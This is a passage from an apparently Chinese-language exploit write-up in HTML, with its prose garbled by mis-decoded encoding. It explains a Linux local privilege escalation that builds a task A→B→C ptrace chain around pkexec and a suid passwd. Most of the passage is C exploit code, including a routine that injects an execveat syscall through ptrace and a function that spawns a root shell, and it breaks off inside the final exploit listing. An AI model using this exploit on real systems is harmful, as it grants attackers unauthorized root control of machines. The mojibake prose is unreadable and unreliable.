OK</span><br>    <span class="hljs-comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span><br>    pid_task_b = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_b)<br>    &#123;<br>        middlePtracee();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><h3 id="Step-II-task-B-fork-task-C">Step.II task B fork task C</h3><p>task B ä¸»è¦çš„å·¥ä½œç¬”è€…éƒ½å°†å…¶å°è£…åœ¨ <code>middlePtracee()</code> ä¸­ï¼Œé¦–å…ˆè¿˜æ˜¯ fork å‡º task Cï¼Œ<strong>æ­¤æ—¶ task A ä¸ task C éƒ½åœ¨ç›‘è§† task B çš„çŠ¶æ€</strong></p><p>æ¥ä¸‹æ¥ task B å°†è‡ªèº«çš„ stdin é‡å®šå‘è‡ª <code>/proc/self/exe</code> ï¼Œ<strong>å°† stdout é‡å®šå‘è‡³é˜»å¡çš„ç®¡é“</strong>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨æ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œ pkexec æ—¶ï¼Œpkexec çš„è¾“å‡ºèµ° stderrï¼Œå› æ­¤ææƒ-&gt;é™æƒè¿™ä¸€æµç¨‹å¹¶ä¸ä¼šé˜»å¡ï¼Œè€Œ pkexec æ‰§è¡Œçš„ helper çš„è¾“å‡ºåˆ™èµ° stdoutï¼Œ<strong>æ­¤æ—¶ç¨‹åºä¼šé˜»å¡åœ¨è¿™é‡Œï¼Œä¸” task B å·²ç»é™æƒï¼Œå› æ­¤ task A å¯ä»¥å€Ÿæ­¤æ—¶æœºæ¥ç®¡ task B</strong></p><p>é‡å®šå‘å®Œæˆåä¾¿æ˜¯å¸¸è§„çš„æ‰§è¡Œ <code>pkexec</code> çš„æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// task B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middlePtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    self_fd = open(<span class="hljs-string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> *<span class="hljs-title">pw</span> =</span> getpwuid(getuid());<br>    pid_task_b = getpid();<br><br>    pid_task_c = fork();<br>    <span class="hljs-keyword">if</span> (!pid_task_c)<br>        <span class="hljs-keyword">return</span> finalPtracee();<br>    <br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    dup2(self_fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// got stdin close</span><br>    dup2(pipe_for_block[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); <span class="hljs-comment">// redirect stdout to block it</span><br>    execl(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="hljs-string">&quot;/usr/bin/pkexec&quot;</span>), <span class="hljs-string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="hljs-string">&quot;--helper&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrive there, we failed.</span><br>    <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-III-task-C-get-root">Step.III task C get root</h3><p>task B æ‰§è¡Œ pkexec ä¹‹åä¼šææƒåˆ° rootï¼Œå½“ task C ç›‘è§†åˆ° task B æ‰§è¡Œ pkexec åä¾¿è°ƒç”¨ <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code> æ¥è·å– task B çš„ root credï¼Œ<strong>ä»è€Œä»¤ task C çš„ ptracer_cred ä¸º root cred</strong>ï¼Œæ­¤æ—¶ task C å†æ‰§è¡Œä¸€ä¸ª suid ç¨‹åºä¾¿èƒ½ä»¥ root æƒé™æ‰§è¡Œï¼Œ<strong>ä¸”ä»ä¿æŒç€è¢« task B ptrace çš„çŠ¶æ€</strong></p><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ‰§è¡Œ <code>/usr/bin/passwd</code>ï¼Œå› ä¸ºå…¶ä¼šç­‰å¾…ç”¨æˆ·è¾“å…¥è€Œä¸ä¼šç›´æ¥é€€å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// task C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">finalPtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    pid_task_c = getpid();<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> needle[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">char</span> uid_buf[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> task_B_status_fd;<br><br>    <span class="hljs-built_in">sprintf</span>(needle, <span class="hljs-string">&quot;/proc/%d/status&quot;</span>, pid_task_b);<br>    <span class="hljs-built_in">sprintf</span>(uid_buf, <span class="hljs-string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());<br>    dup2(self_fd, <span class="hljs-number">114</span>);<br>    task_B_status_fd = open(needle, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (task_B_status_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">// check out uid of task B</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        buf[pread(task_B_status_fd, buf, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(buf, uid_buf)) <span class="hljs-comment">// task B got root</span><br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// let task B(root) be ptracer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Task B is root now!&quot;</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);<br>    execl(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// if we arrived there, execve failed </span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Task C failed to execve!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-task-A-attach-task-B">Step.IV task A attach task B</h3><p>task A åœ¨ fork å‡º task B ä¹‹åä¾¿æŒç»­ç›‘è§† task B çš„çŠ¶æ€ï¼Œå½“ task B æ‰§è¡Œ helper æ—¶<strong>è¯´æ˜ task B å·²ç»é™æƒå¹¶é˜»å¡ï¼Œæ­¤æ—¶ task A ä¾¿æœ‰è¶³å¤Ÿçš„æƒé™ ptrace task B</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);<br>   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>   &#123;<br>       <span class="hljs-type">char</span> comm[<span class="hljs-number">0x100</span>];<br>       <span class="hljs-type">int</span> comm_fd = open(buf, O_RDONLY);<br>       <span class="hljs-keyword">if</span> (comm_fd &lt; <span class="hljs-number">0</span>)<br>       &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br>       comm[read(comm_fd, comm, <span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(comm, helper_basename, <span class="hljs-number">10</span>))<br>           <span class="hljs-keyword">break</span>;<br>       usleep(<span class="hljs-number">100000</span>);<br>   &#125;<br><br>   <span class="hljs-comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span><br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);<br>   ptrace(PTRACE_ATTACH, pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>   waitpid(pid_task_b, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0 means no extra options</span><br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><h3 id="Step-V-get-privileged-by-multistage-ptrace-link">Step.V get privileged by multistage ptrace link</h3><p>å½“ç¨‹åºè¿è¡Œåˆ°è¿™ä¸€æ­¥æ—¶ï¼Œ<strong>æˆ‘ä»¬å·²ç»æˆåŠŸå»ºç«‹äº†</strong> <code>task A -&gt; task B -&gt; task C</code> <strong>è¿™ä¸€å¤šçº§ ptrace é“¾æ¡</strong>ï¼Œæ­¤æ—¶ task Aã€B ä¸ºç”¨æˆ·æƒé™ï¼Œtask C ä¸º root æƒé™ï¼Œ<strong>è€Œ task C ä¿å­˜çš„ ptracer_cred åŒä¸º root æƒé™</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ task A æ§åˆ¶ task B æ§åˆ¶ task C æ¥å®Œæˆææƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">// in task A</span><br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-comment">// force the task B to execve stage2</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);<br>    forceChildToExecve(pid_task_b, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;stage2&quot;</span>);<br>    <span class="hljs-comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">// task again B</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">middleStage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> child = waitpid(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    forceChildToExecve(child, <span class="hljs-number">114</span>, <span class="hljs-string">&quot;stage3&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// task again C</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªè‡ªè¡Œç¼–å†™çš„ <code>forceChildToExecve()</code> å‡½æ•°ï¼Œä¸»è¦æ˜¯æ§åˆ¶ ptracee è¿›ç¨‹é€šè¿‡ execveat ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œå› exp ç¨‹åºçš„ä¸åŒå…¥å£ï¼Œå…·ä½“ç»†èŠ‚å‚è§æ³¨é‡Šï¼Œè¿™é‡Œä¸å†èµ˜å™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// force a child to execve by ptrace through execveat syscall</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">forceChildToExecve</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> child_pid, <span class="hljs-type">int</span> exec_fd, <span class="hljs-type">char</span> *argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">regs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> <br>    &#123;<br>        .iov_base = &amp;regs,<br>        .iov_len = <span class="hljs-keyword">sizeof</span>(regs),<br>    &#125;;<br>    <span class="hljs-type">size_t</span> child_stack;<br>    <span class="hljs-type">size_t</span> insert_data[<span class="hljs-number">0x100</span>];<br><br>    ptrace(PTRACE_SYSCALL, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// wait for child meeting a syscall</span><br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// wait for child to execve</span><br>    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="hljs-comment">// get env of child</span><br>    <br>    <span class="hljs-comment">// prepare the stack data</span><br>    child_stack = (regs.rsp - <span class="hljs-number">0x1000</span>) &amp; ~<span class="hljs-number">0xfff</span>UL; <br>    <span class="hljs-built_in">memset</span>(insert_data, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(insert_data));<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = child_stack + <span class="hljs-number">0x18</span>;    <span class="hljs-comment">// argv arrays</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;<br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// env arrays</span><br>    insert_data[idx++] = *(<span class="hljs-type">size_t</span>*)argv;          <span class="hljs-comment">// argv[0]</span><br>    insert_data[idx++] = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// path</span><br><br>    <span class="hljs-comment">// copy to child stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; idx; i++)<br>        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>), insert_data[i]);<br><br>    <span class="hljs-comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span><br>    regs.orig_rax = __NR_execveat;<br>    regs.rdi = exec_fd;<br>    regs.rsi = child_stack + <span class="hljs-number">0x20</span>;  <span class="hljs-comment">// path -&gt; NULL</span><br>    regs.rdx = child_stack;         <span class="hljs-comment">// argv -&gt; &quot;stagex&quot;, NULL</span><br>    regs.r10 = child_stack + <span class="hljs-number">0x10</span>;  <span class="hljs-comment">// envp -&gt; NULL</span><br>    regs.r8  = AT_EMPTY_PATH;       <span class="hljs-comment">// flags</span><br><br>    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);<br>    ptrace(PTRACE_DETACH, child_pid, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    waitpid(child_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Final-EXP">Final EXP</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/elf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *helper_list[] = <br>&#123;<br>    <span class="hljs-string">&quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/sbin/mate-power-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/bin/xfpm-power-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/bin/lxqt-backlight_backend&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/libexec/gsd-wacom-led-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/libexec/gsd-wacom-oled-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/libexec/gsd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gsd-backlight-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gsd-wacom-led-helper&quot;</span>,<br>    <span class="hljs-string">&quot;/usr/lib/gsd-wacom-oled-helper&quot;</span>,<br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *helper = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *helper_basename = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> pipe_for_block[<span class="hljs-number">2</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> self_fd;<br><span class="hljs-type">pid_t</span> pid_task_b;<br><span class="hljs-type">pid_t</span> pid_task_c;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">findHelper</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">middleStage</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">middlePtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">finalPtracee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">forceChildToExecve</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> child_pid, <span class="hljs-type">int</span> exec_fd, <span class="hljs-type">char</span> *argv)</span>;<br><br><span class="hljs-comment">// mainly for task a, and jmp for stage 2 and 3</span><br><span class="hljs-type">int</span> <span class="hljs-title 